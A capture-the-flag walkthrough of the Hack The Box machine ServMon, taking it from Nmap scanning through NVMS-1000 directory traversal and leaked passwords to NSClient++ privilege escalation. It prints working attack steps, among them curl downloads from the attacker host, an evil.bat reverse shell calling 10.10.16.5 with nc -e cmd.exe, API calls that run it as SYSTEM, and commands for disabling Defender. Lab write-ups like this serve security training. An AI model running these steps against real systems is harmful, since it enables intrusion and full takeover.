### Index
1. Initial Nmap Enumeration
2. Port 21 FTP Allowed Anonymous Access - But No Write Access
3. Port 80 - Web Enumeration - [CVE-2019-20085](https://www.exploit-db.com/exploits/48311) 
	3.1  Directory Traversal Attack the read Passwords.txt file located on the User's Desktop
	3.2  Using the obtained list of password to try on SSH and Web.
4.  Privilege Escalation using winPEAS.bat or winPEAS.ps1 
	4.1  Downloading File using cURL
5.  NSClient++ Privilege Escalation
6. Lesson Learned
	6.1  Disabling Real Time Monitoring for Windows Defender on Widnows

### Initial Nmap Enumeration

```
$ nmap -p- --min-rate=1000 -Pn -T4 -sC -sV servmon.htb 
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_02-28-22  07:35PM       <DIR>          Users
| ftp-syst: 
|_  SYST: Windows_NT
22/tcp    open  ssh           OpenSSH for_Windows_8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 c7:1a:f6:81:ca:17:78:d0:27:db:cd:46:2a:09:2b:54 (RSA)
|   256 3e:63:ef:3b:6e:3e:4a:90:f3:4c:02:e9:40:67:2e:42 (ECDSA)
|_  256 5a:48:c8:cd:39:78:21:29:ef:fb:ae:82:1d:03:ad:af (ED25519)
80/tcp    open  http
|_http-title: Site doesn't have a title (text/html).
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     Content-type: text/html
|     Content-Length: 0
|     Connection: close
|     AuthInfo:
|   GetRequest, HTTPOptions, RTSPRequest: 
|     HTTP/1.1 200 OK
|     Content-type: text/html
|     Content-Length: 340
|     Connection: close
|     AuthInfo: 
|     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
|     <html xmlns="http://www.w3.org/1999/xhtml">
|     <head>
|     <title></title>
|     <script type="text/javascript">
|     window.location.href = "Pages/login.htm";
|     </script>
|     </head>
|     <body>
|     </body>
|_    </html>
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5666/tcp  open  tcpwrapped
6063/tcp  open  tcpwrapped
6699/tcp  open  tcpwrapped
8443/tcp  open  ssl/https-alt
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2020-01-14T13:24:20
|_Not valid after:  2021-01-13T13:24:20
| http-title: NSClient++
|_Requested resource was /index.html
|_ssl-date: TLS randomness does not represent time
| fingerprint-strings: 
|   FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions: 
|     HTTP/1.1 404
|     Content-Length: 18
|     Document not found
|   GetRequest: 
|     HTTP/1.1 302
|     Content-Length: 0
|_    Location: /index.html
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port80-TCP:V=7.94SVN%I=7%D=8/15%Time=66BECAC4%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/html\r\n
SF:Content-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n\r\n
SF:\xef\xbb\xbf<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\x201\
SF:.0\x20Transitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xhtml1-
SF:transitional\.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3\.org/1999/x
SF:html\">\r\n<head>\r\n\x20\x20\x20\x20<title></title>\r\n\x20\x20\x20\x2
SF:0<script\x20type=\"text/javascript\">\r\n\x20\x20\x20\x20\x20\x20\x20\x
SF:20window\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x20\x20\x20\
SF:x20</script>\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n")%r(HTTPOpt
SF:ions,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/html\r\nConte
SF:nt-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n\r\n\xef\
SF:xbb\xbf<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\x201\.0\x2
SF:0Transitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xhtml1-trans
SF:itional\.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3\.org/1999/xhtml\
SF:">\r\n<head>\r\n\x20\x20\x20\x20<title></title>\r\n\x20\x20\x20\x20<scr
SF:ipt\x20type=\"text/javascript\">\r\n\x20\x20\x20\x20\x20\x20\x20\x20win
SF:dow\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x20\x20\x20\x20</
SF:script>\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n")%r(RTSPRequest,
SF:1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/html\r\nContent-Le
SF:ngth:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n\r\n\xef\xbb\x
SF:bf<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\x201\.0\x20Tran
SF:sitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xhtml1-transition
SF:al\.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3\.org/1999/xhtml\">\r\
SF:n<head>\r\n\x20\x20\x20\x20<title></title>\r\n\x20\x20\x20\x20<script\x
SF:20type=\"text/javascript\">\r\n\x20\x20\x20\x20\x20\x20\x20\x20window\.
SF:location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x20\x20\x20\x20</scrip
SF:t>\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n")%r(FourOhFourRequest
SF:,65,"HTTP/1\.1\x20404\x20Not\x20Found\r\nContent-type:\x20text/html\r\n
SF:Content-Length:\x200\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8443-TCP:V=7.94SVN%T=SSL%I=7%D=8/15%Time=66BECACB%P=x86_64-pc-linux
SF:-gnu%r(GetRequest,74,"HTTP/1\.1\x20302\r\nContent-Length:\x200\r\nLocat
SF:ion:\x20/index\.html\r\n\r\n\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\
SF:0\0\0\0\0\0\0\0\0s\0d\0a\0y\0:\0T\0h\0u\0:\0T\0h\0u\0r\0s\0")%r(HTTPOpt
SF:ions,36,"HTTP/1\.1\x20404\r\nContent-Length:\x2018\r\n\r\nDocument\x20n
SF:ot\x20found")%r(FourOhFourRequest,36,"HTTP/1\.1\x20404\r\nContent-Lengt
SF:h:\x2018\r\n\r\nDocument\x20not\x20found")%r(RTSPRequest,36,"HTTP/1\.1\
SF:x20404\r\nContent-Length:\x2018\r\n\r\nDocument\x20not\x20found")%r(SIP
SF:Options,36,"HTTP/1\.1\x20404\r\nContent-Length:\x2018\r\n\r\nDocument\x
SF:20not\x20found");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-08-16T03:44:53
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

```

Looking at the initial results, it looks like the `anonymous` FTP login is allowed. Let's start digging FTP First. But first, I'd prefer to run all Nmap's NSE scripts for FTP on port 21. Just to make sure I don't left anything during enumeration.
```
$ sudo nmap -sV -p21 -sC --script=ftp-* 10.10.10.184
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-16 00:04 EDT
Nmap scan report for servmon.htb (10.10.10.184)
Host is up (0.045s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_02-28-22  07:35PM       <DIR>          Users
| ftp-brute: 
|   Accounts: No valid accounts found
|_  Statistics: Performed 19944 guesses in 600 seconds, average tps: 33.5
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 600.89 seconds
```

### Port 21 - FTP Anonymous Access Allowed

Accessing FTP port and getting two text files

```
$ ftp anonymous@10.10.10.184
Connected to 10.10.10.184.
220 Microsoft FTP Service
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
####################################################################################################################################################
ftp> dir
229 Entering Extended Passive Mode (|||49697|)
125 Data connection already open; Transfer starting.
02-28-22  07:35PM       <DIR>          Users
226 Transfer complete.
####################################################################################################################################################
ftp> cd Users
250 CWD command successful.
####################################################################################################################################################
ftp> dir
229 Entering Extended Passive Mode (|||49698|)
125 Data connection already open; Transfer starting.
02-28-22  07:36PM       <DIR>          Nadine
02-28-22  07:37PM       <DIR>          Nathan
226 Transfer complete.
####################################################################################################################################################
ftp> cd Nadine
250 CWD command successful.
####################################################################################################################################################
ftp> dir
229 Entering Extended Passive Mode (|||49699|)
125 Data connection already open; Transfer starting.
02-28-22  07:36PM                  168 Confidential.txt
226 Transfer complete.
####################################################################################################################################################
ftp> get Confidential.txt
local: Confidential.txt remote: Confidential.txt
229 Entering Extended Passive Mode (|||49700|)
125 Data connection already open; Transfer starting.
100% |***************************************************************************************************************************|   168        0.95 KiB/s    00:00 ETA
226 Transfer complete.
WARNING! 6 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
168 bytes received in 00:00 (0.80 KiB/s)
####################################################################################################################################################
ftp> cd ..
250 CWD command successful.
####################################################################################################################################################
ftp> cd Nathan
250 CWD command successful.
####################################################################################################################################################
ftp> dir
229 Entering Extended Passive Mode (|||49701|)
125 Data connection already open; Transfer starting.
02-28-22  07:36PM                  182 Notes to do.txt
226 Transfer complete.
####################################################################################################################################################
ftp> get "Notes to do.txt"
local: Notes to do.txt remote: Notes to do.txt
229 Entering Extended Passive Mode (|||49702|)
125 Data connection already open; Transfer starting.
100% |***************************************************************************************************************************|   182        5.69 KiB/s    00:00 ETA
226 Transfer complete.
WARNING! 4 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
182 bytes received in 00:00 (2.72 KiB/s)
####################################################################################################################################################
ftp> put test.txt
local: test.txt remote: test.txt
229 Entering Extended Passive Mode (|||49703|)
550 Access is denied. 
ftp> 
```

Other than two text files, the FTP anonymous access did not allowed me to write something on the Share. Here is the Content of those two files.

```
──(ringbuffer㉿kali)-[~/Downloads/Servmon.htb]
└─$ more Confidential.txt                    
Nathan,

I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.

Regards

Nadine

┌──(ringbuffer㉿kali)-[~/Downloads/Servmon.htb]
└─$ more Notes\ to\ do.txt                 
1) Change the password for NVMS - Complete
2) Lock down the NSClient Access - Complete
3) Upload the passwords
4) Remove public access to NVMS
5) Place the secret files in SharePoint

```

So we know that there's a Password.txt file involved and is present somewhere on the Desktop. I think I might have to access Desktop and get the Password for Nathan to get the user flag. Not sure tho. Let's keep digging. Let's try out port 80

### Port 80 - Web Enumeration

The Login Page - NVMS 1000 - Network Video Monitoring System 

![](Pasted%20image%2020240816004339.png)

Upon Digging on the Internet for NVMS-1000, I found that this version of NVMS is vulnerable to [Directory Traversal Attack](https://www.exploit-db.com/exploits/48311). Looking at the exploit, I notice that the variable `traversal` has the following values in the exploit code. 
`traversal = "../../../../../../../../../../../../../"`
I don't want to run the exploit so I took a little different approach. I fire up the Burp Suite and Intercept the first web request.
![](Pasted%20image%2020240816010107.png)

Sending this first request to repeater and putting the same payload we notice in the Exploit Code. But **Remember:** We notice that we saw the **Confidentials.txt**  file. We will here need to grab the Passwords.txt file. After trying, I was able to extract the Passwords.txt file. Here's my HTTP Request and Response pair look like.

![](Pasted%20image%2020240816010313.png)

So we know that we have two users that are present on the system `Nathan` and `Nadine`. I first tried all of these password on port 22 (SSH) for the user Nathan and did not work. Than I tried all these password on Port 80 (Web) for the user Nathan and Did not work. Than i tried  all these password again on Port 22 (SSH) for the user `Nadine`.
Guess what? The third password `B3WithM30r4ga1n5tMe` works on SSH for the user `Nadine`. Looks like the user `Nadine` put his own password in the Passwords.txt file. We got our User flag. **TRAP: If for Any Reason SSH Disconnects and the third password doesn't work, Try any other password from the same list. Passwords are ratable on this box. My SSH Connection died and than the second password was working.**

```
$ ssh nadine@10.10.10.184
nadine@10.10.10.184's password: 
Microsoft Windows [Version 10.0.17763.864]
(c) 2018 Microsoft Corporation. All rights reserved.

nadine@SERVMON C:\Users\Nadine\Desktop>type user.txt 
852b58d320970f5c300468b7b4533ea9 
```

### Privilege Escalation using winPEAS.bat

So our usual `impacket-smbserver` will not work here because upon doing `net use \\10.10.16.5\a` on the Target, I got the following error.
```
PS C:\tmp> net use \\10.10.16.5\a
System error 384 has occurred.

You can't connect to the file share because it's not secure. This share requires the obsolete SMB1 protocol, which is unsafe and could expose your system to attack.    
Your system requires SMB2 or higher. For more info on resolving this issue, see: https://go.microsoft.com/fwlink/?linkid=852747
```

However, Curl and Wget is installed. Let's download the file using curl.

```
curl -o winPEAS.ps1 http://10.10.16.5/winPEAS.ps1
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 78634  100 78634    0     0  78634      0  0:00:01 --:--:--  0:00:01  140k

nadine@SERVMON C:\tmp>dir 
 Volume in drive C has no label.                   
 Volume Serial Number is 20C1-47A1                 
                                                   
 Directory of C:\tmp                               
                                                   
08/15/2024  09:21 PM    <DIR>          .           
08/15/2024  09:21 PM    <DIR>          ..          
08/15/2024  09:21 PM            78,634 winPEAS.ps1 
               1 File(s)         78,634 bytes      
               2 Dir(s)   6,086,201,344 bytes free 
```

Executing winPEAS.ps1 and couple of important findings
```
=========|| Checking for DPAPI Cred Master Keys
Use the Mimikatz 'dpapi::cred' module with appropriate /masterkey to decrypt
You can also extract many DPAPI masterkeys from memory with the Mimikatz 'sekurlsa::dpapi' module
https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#dpapi

    Directory: C:\Users\nadine\AppData\Local\Microsoft\Credentials
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a-hs-        2/28/2022   7:04 PM          11088 DFBE70A7E5CC19A398EBF1B96859CE5D
```

### NSClient++ - Privilege Escalation 

So after digging into the box, I had to look at the question on HTB and one of the question was as follows
`There's an unusual third part application on the system. What's the name of a very this software?`

I looked into `C:\Program Files\` Directory and found that `NSClient++` was installed. After exploring the `C:\Program Files\NSClient++\` folder, I notice one of the interesting file `nsclient.ini`. Here is the output look like.

```
nadine@SERVMON C:\Program Files\NSClient++>type nsclient.ini 

; in flight - TODO
[/settings/default]

; Undocumented key
password = ew2x6SsGTxjRwXOT

; Undocumented key
allowed hosts = 127.0.0.1

; CheckTaskSched - Check status of your scheduled jobs. 
CheckTaskSched = enabled

; Scheduler - Use this to schedule check commands and jobs in conjunction with for instance passive monitoring through NSCA
Scheduler = enabled

; CheckExternalScripts - Module used to execute external scripts
CheckExternalScripts = enabled


```


Few important things to note here. The NSClient++ runs the localhost (127.0.0.1). If you look at the initial Nmap Scan result, we notice that the Port `8443/tcp` is running NSClient++ on the localhost. Next, we have a password in a plain text. This is probably the Admin account password for NSClient++. Notice that the `CheckExternalScripts` is Enabled. Which means we can load the external Script. So upon digging on Exploit-DB, I found the [NSClient++ 0.5.2.35 - Privilege Escalation](https://www.exploit-db.com/exploits/46802) Exploit. Which has all the details on how to take advantage of this exploit. **HOWEVER**, I want to highlight two important points here that I experience while solving this box. 

- **Windows Defender is Enabled on the target so your usual nc.exe from kali won't work. You will need nc64.exe from GitHub**
- **Scheduler throws an error if you are configuring the Privilege Escalation steps from Browser. You will need to Interact with NSClient++ API.**
- **Here is the NSClient++ Documentation Link for [Adding Script](https://nsclient.org/docs/api/rest/scripts/#add-script) and [Executing Script](https://nsclient.org/docs/api/rest/queries/#command-execute)

Okay, I had to use the combination of APIs as well as GUI to perform the Privilege Escalation. Now We have access to `nadine` user account. We will first create a `tmp` directory on C Drive and put two files in it. First one is `evil.bat` and the second one is `nc64.exe`. I have renamed `nc64.exe` to just `nc.exe`.

```
nadine@SERVMON C:\>mkdir tmp

nadine@SERVMON C:\>cd tmp

nadine@SERVMON C:\tmp>curl -o evil.bat http://10.10.16.5/evil.bat
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    40  100    40    0     0     40      0  0:00:01 --:--:--  0:00:01   197

nadine@SERVMON C:\tmp>curl -o nc.exe http://10.10.16.5/nc.exe
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 45272  100 45272    0     0  45272      0  0:00:01 --:--:--  0:00:01 85097

nadine@SERVMON C:\tmp>dir 
 Volume in drive C has no label. 
 Volume Serial Number is 20C1-47A1

 Directory of C:\tmp

08/17/2024  09:20 PM    <DIR>          .
08/17/2024  09:20 PM    <DIR>          ..
08/17/2024  09:20 PM                40 evil.bat
08/17/2024  09:20 PM            45,272 nc.exe
               2 File(s)         45,312 bytes
               2 Dir(s)   6,087,421,952 bytes free
```

SMB was disabled on this box, so our usual, `impacet-smbserver` did not work. I spin up a python server on kali using `python -m http.server` from the `/Download/ServMon.HTB` Directory. This directory has both nc.exe and evil.bat. Now Here is the content of `evil.bat`.

```
$ more evil.bat 
C:\tmp\nc.exe 10.10.16.5 443 -e cmd.exe
```

The `evil.bat` triggers the `nc.exe` command with `-e` switch to start the cmd.exe. Now we will need to run the external script. OH! I forgot to mention that now you will need to ssh again to the `nadine` user and setup a `port forwarding`. So basically SSH into the box as user `nadine` with the following command. 

```
$ sshpass -p 'L1k3B1gBut7s@W0rk' ssh nadine@10.10.10.184 -L 8443:127.0.0.1:8443
```

Now as mentioned above, NSClient++ is running on Port `8443/tcp` and in the above command, we have setup the local `port forwarding` so that now we can access NSClient++ into our web browser using `https://127.0.0.1:8443/`.

![](Pasted%20image%2020240818002646.png)

Great!. Now we will use the password we have obtained from the `nsclient.ini` file and Login. The reason password work here is because we have setup `port forwarding`. Now Let's setup the External Script. **Settings --> External Script --> Scripts --> Add New**

![](Pasted%20image%2020240818002850.png)

Put the key as anything and value as `C:\tmp\evil.bat`. Here we are calling `evil.bat` using the Process `NSClient++` running on the localhost. So that we will have a shell which has the higher privileges.  Now Scroll down a bit and Click on **Scheduler --> Schedules --> Add New**

![](Pasted%20image%2020240818003122.png)

Configure the Scheduler to start the `command` at 5 second interval once the NSClient++ restarts. Now **Save the changes from the top **Changes** drop down and from the **Control** Dropdown menu select **Reload**. Now if you're lucky, you will get the reverse shell in 5 seconds. But I didn't get the reverse shell my listener was running. 

```
$ nc -lvnp 443
listening on [any] 443 ...

```

At this point, I choose to interact with the backend API instead of doing it through the browser. **Remember** we have `nc.exe` present on the server. But we not going to add `evil.bat` as a parameter for the External Script. I ran the following command from my Kali Machine.

```
$ curl -k -u admin:ew2x6SsGTxjRwXOT -X PUT https://127.0.0.1:8443/api/v1/scripts/ext/scripts/evil.bat --data-binary @evil.bat 
Added evil as scripts\evil.bat 
```

Now we have added our evil.bat in the script folder. Let's verify.
```
nadine@SERVMON C:\Program Files\NSClient++>cd scripts 

nadine@SERVMON C:\Program Files\NSClient++\scripts>dir 
 Volume in drive C has no label. 
 Volume Serial Number is 20C1-47A1
11/05/2017  11:11 PM             2,715 check_updates.vbs
02/28/2022  07:55 PM    <DIR>          custom
08/17/2024  09:56 PM                40 evil.bat
              17 File(s)         33,176 bytes
               6 Dir(s)   6,106,927,104 bytes free
```

Now we are again going to interact with the backed API and execute our `evil.bat` from here. Make sure you've Listener running using `nc -lvnp 443` on your kali.

```
$ curl -k -u admin:ew2x6SsGTxjRwXOT "https://127.0.0.1:8443/api/v1/queries/evil/commands/execute" 

```

As soon as you run the above command, you will notice that you got the Reverse Shell where the Listener was running.
```
$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.16.5] from (UNKNOWN) [10.10.10.184] 50534
Microsoft Windows [Version 10.0.17763.864]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Program Files\NSClient++>whoami
whoami
nt authority\system

C:\Program Files\NSClient++>

```

Get your Root Flag from Admin's Desktop Directory.

### Lesson Learned
1.  Windows Defender was enabled and our usual nc.exe from the Kali was keep getting deleted.
2.  Curl's `--data-binary` argument upload the files from the current directory onto the server.
3.  I tried to use [PowerCat](https://github.com/besimorhino/powercat) but not heplful. The Windows Defender kept flagging it as malicious file.
4.  Due to Low Privilege Escalation user `nadine` access, the disabling of real time monitoring using `powershell Set-MpPreference -DisableRealtimeMonitoring $true` was not allowed.
5. Although, I was at one point by pass the restrictions for the PowerShell Policy Execution using `powershell.exe Set-ExecutionPolicy -Scope CurrentUSer`.
6. Reading the NSClient++ Documentation was bit helpful in calling and adding scripts.
7. Sometimes, you will use double forward slash (\\\\) instead of single to call .bat file.

